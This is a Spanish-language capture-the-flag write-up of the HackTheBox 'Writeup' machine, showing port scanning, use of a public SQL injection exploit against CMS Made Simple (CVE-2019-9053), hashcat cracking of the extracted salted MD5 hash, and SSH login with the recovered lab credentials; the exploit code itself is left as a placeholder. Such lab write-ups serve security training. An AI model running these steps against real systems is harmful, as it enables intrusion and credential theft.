
# 🕵️‍♂️ Reconocimiento

Comenzamos con el escaneo de puertos utilizando `nmap`:

```bash
nmap -p- --open -sS -Pn -vvv -n --min-rate 5000 10.10.10.138 -oG allports
nmap -sCV -p80,22 10.10.10.138
```

![[Writeup1.png]]

El resultado indica que los puertos **22 (SSH)** y **80 (HTTP)** están abiertos.

Esto nos permite acceder a:

- 🌐 Página principal: [http://10.10.10.138/](http://10.10.10.138/)
- 📄 Archivo `robots.txt`: [http://10.10.10.138/robots.txt](http://10.10.10.138/robots.txt)

---

Al entrar a la página principal vemos que tiene una protección anti-DDoS que bloquea la enumeración.  
Probamos fuzzing con `ffuf` y `gobuster`, pero no obtuvimos resultados útiles.

![[Writeup2.png]]

Sin embargo, al ingresar a `robots.txt` encontramos una ruta interesante:

- [http://10.10.10.138/writeup/](http://10.10.10.138/writeup/)

![[Writeup3.png]]

Al inspeccionar el código fuente del sitio `/writeup`, vemos que el CMS utilizado es **CMS Made Simple**.  
El pie de página indica un copyright de 2004–2019, lo que sugiere que podría estar usando una versión antigua (potencialmente vulnerable).

![[Writeup4.png]]

---

# 🔍 Búsqueda de vulnerabilidades

Buscamos en `searchsploit`:

```bash
searchsploit CMS Made Simple
```

Encontramos una vulnerabilidad de **inyección SQL no autenticada** en la versión **2.2.10** (CVE-2019-9053).

![[Writeup5.png]]

La copiamos con:

```bash
searchsploit -m php/webapps/46635.py
```

Al ejecutar el exploit en **Python 2.7** tuvimos errores con el módulo `termcolor`, así que lo convertimos a **Python 3** usando ChatGPT.

---

# 🐍 Exploit en Python 3

Guardamos el siguiente código como `exploit.py`:

```python
# (Pegar aquí el código completo convertido a Python 3 que ya tenés)
```

Ejecutamos el script con:

```bash
python3 exploit.py -u http://10.10.10.138/writeup/ -w /usr/share/wordlists/rockyou.txt
```

> 🔧 El parámetro `-u` es para la URL objetivo y `-w` es para el diccionario.  
> ⚙️ Tuvimos que modificar la variable `TIME = 1` a `TIME = 2` para evitar falsos positivos.

![[Writeup6.png]]

---

# 🧂 Resultado del exploit

El exploit extrae la siguiente información:

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

---

# 🔓 Crackear contraseña con Hashcat

Como el hash tiene **32 caracteres**, es probable que sea **MD5**.

Creamos un archivo llamado `hash` con el contenido:

```
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
```

Ejecutamos Hashcat:

```bash
hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
```

Parámetros:

- `-a 0`: Ataque directo con diccionario.
- `-m 20`: Tipo de hash → MD5(salt + password)

Resultado del crackeo:

```
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```

![[Writeup7.png]]

Ahora que ya tenemos un usuario y contraseña válidos, vamos a intentar conectarnos por SSH:

- Usuario: `jkr`
- Contraseña: `raykayjay9`

---

# 💻 Intrusión por SSH

```bash
ssh jkr@10.10.10.138
# Contraseña: raykayjay9
```

![[Writeup8.png]]

---

# 🧠 Notas

Un **salt** es una **cadena aleatoria** que se añade a una contraseña antes de aplicarle una función hash (como MD5, SHA-1, etc.). Esto se hace para:

- Evitar que dos usuarios con la misma contraseña tengan el mismo hash.
- Hacer que los ataques con diccionarios precomputados (como rainbow tables) sean inútiles sin conocer el salt.

---

### 🧠 Reglas comunes para identificar hashes por longitud:

| Tipo de Hash | Longitud | Ejemplo |
|--------------|----------|---------|
| **MD5**      | 32       | `5f4dcc3b5aa765d61d8327deb882cf99` |
| **SHA-1**    | 40       | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| **SHA-256**  | 64       | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd7...` |
| **SHA-512**  | 128      | `cf83e1357eefb8bd...` |
| **NTLM**     | 32       | `32ed87bdb5fdc5e9cba88547376818d4` |
| **bcrypt**   | 60       | `$2y$10$e0NRW5B8...` |
| **LM hash**  | 32       | Solo letras mayúsculas y números |

---

# 📂 Archivo donde se guardan los hashes crackeados por Hashcat

Podés buscar el archivo con:

```bash
find / -name "hashcat.potfile" 2>/dev/null
```

En mi caso estaba en:

```bash
/root/.local/share/hashcat/hashcat.potfile
```

Para ver los hashes crackeados:

```bash
cat /root/.local/share/hashcat/hashcat.potfile
```

---

# 📚 Créditos

Se utilizó ayuda de los siguientes recursos:

- [🎥 Video de la maquina que usamos](https://www.youtube.com/watch?v=sG7_MYqAcu0)
- Writeup en PDF de HackTheBox:  
  
